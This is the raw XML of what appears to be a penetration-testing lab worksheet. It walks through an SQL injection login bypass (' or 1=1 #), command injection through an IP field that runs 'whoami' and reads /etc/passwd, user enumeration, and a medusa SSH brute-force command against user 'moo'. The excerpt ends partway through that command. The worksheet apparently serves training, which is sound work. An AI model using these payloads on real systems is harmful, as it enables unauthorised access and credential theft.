    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="2" w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1080" w:right="7549"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>T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o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>o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ls &amp; T</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>e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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>c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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>hn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iqu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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>e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 xml:space="preserve">s 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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Y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ou’</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>l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 xml:space="preserve">l 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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>U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se</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="5" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="12"/>
          <w:szCs w:val="12"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="144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w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="42"/>
          <w:w w:val="13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QL Injecti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 xml:space="preserve">n – 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 xml:space="preserve">o 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g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 xml:space="preserve">in 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un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ut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orized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web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cc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ss</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="54"/>
        <w:ind w:left="144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w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="42"/>
          <w:w w:val="13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Com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Inj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ct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on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 xml:space="preserve">– </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="-3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 xml:space="preserve">o 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x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cute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syst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m c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 xml:space="preserve"> v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ia the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web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pacing w:val="-3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nte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ce</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="54"/>
        <w:ind w:left="144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w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="42"/>
          <w:w w:val="13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 xml:space="preserve">er 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um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spacing w:val="-3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on</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="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 xml:space="preserve">– </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="-3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 xml:space="preserve">o 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spacing w:val="-3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v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er inte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l u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 xml:space="preserve">er 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nts</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="51"/>
        <w:ind w:left="144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w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="42"/>
          <w:w w:val="13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spacing w:val="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 xml:space="preserve">– </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="-3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o b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ute-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 xml:space="preserve">orce </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="-3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H c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ntials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 xml:space="preserve">or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="-3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er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spacing w:val="-3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cc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ss</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="54"/>
        <w:ind w:left="144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w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="42"/>
          <w:w w:val="13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SS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 xml:space="preserve">H – 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 xml:space="preserve">o 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 xml:space="preserve">he </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="-3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g</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="-3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system wi</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="-4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v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spacing w:val="-3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cr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="-3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ials</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="18" w:line="220" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1080" w:right="8136"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pP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S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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>t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ep-b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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>y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-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>S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 xml:space="preserve">tep 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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>In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st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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-3"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>u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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>c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t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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>i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ons</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="14" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1440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1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 xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="38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 xml:space="preserve">Log in to the </w:t>
      </w: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W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eb</w:t>
      </w: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Inter</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>f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a</w:t>
      </w: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e Using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SQL Injec</w:t>
      </w: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t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ion</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:line="258" w:lineRule="auto"/>
        <w:ind w:left="1800" w:right="5345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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="2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Open Fi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ox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n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K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li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nd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v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igate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 t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 target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si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e.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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="2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e 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he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e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QL inj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ct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n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om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Fl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g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1 to log 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n:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="10" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="15"/>
          <w:szCs w:val="15"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="252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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>' or 1=1 #</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="9" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="17"/>
          <w:szCs w:val="17"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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c.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="37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Con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m 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y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u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e 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ogg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into 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he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 inte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e.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1440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2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 xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="38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 xml:space="preserve">Find the </w:t>
      </w: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T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 xml:space="preserve">t Page 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>w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ith</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2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Co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>mm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and Injec</w:t>
      </w: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t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ion</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="2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v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igate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 t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'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un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um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nt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eg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ss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on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s'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ge.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="21"/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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="2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In the IP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f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el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,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or c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inject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sing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v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us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:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="7" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="17"/>
          <w:szCs w:val="17"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="252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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>127.0.0.1;ip a</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="252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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>127.0.0.1;hostname</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="252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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>127.0.0.1;whoami</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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c.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="37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Att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empt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o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bt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in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py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/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/p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ss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w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:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="7" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="17"/>
          <w:szCs w:val="17"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="252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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>127.0.0.1;cat /etc/passwd</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="20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ec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y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ser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you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er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v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e:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="100" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="10"/>
          <w:szCs w:val="10"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="10300"/>
        </w:tabs>
        <w:spacing w:line="240" w:lineRule="exact"/>
        <w:ind w:left="252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808080"/>
          <w:position w:val="-1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color w:val="808080"/>
          <w:spacing w:val="1"/>
          <w:position w:val="-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808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>er</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:spacing w:val="-2"/>
          <w:position w:val="-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808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="808080"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="0017251C">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="808080"/>
        </w:rPr>
        <w:t>deaana, moo, mannie</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="808080"/>
        </w:rPr>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="12" w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="34"/>
        <w:ind w:left="1440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3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 xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="38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>B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rute For</w:t>
      </w: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e SSH A</w:t>
      </w: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cc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A4634E"/>
          <w:spacing w:val="-3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 xml:space="preserve">for </w:t>
      </w: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U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er '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>m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oo'</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="2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 per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orm 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pa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sword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br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ute-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ce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ck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ga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SS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 (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ne li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e):</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="9" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="17"/>
          <w:szCs w:val="17"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="252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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">medusa </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">h &lt;target_IP&gt; </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">u moo </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>P</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="19"/>
        <w:ind w:left="2520"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:sectPr w:rsidR="00CF78E9">
          <w:pgSz w:w="12240" w:h="15840"/>
          <w:pgMar w:top="700" w:right="0" w:bottom="280" w:left="0" w:header="0" w:footer="765" w:gutter="0"/>
          <w:cols w:space="720"/>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>/usr/sh</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">re/wordlists/most_used_passwords.txt </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">M ssh </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
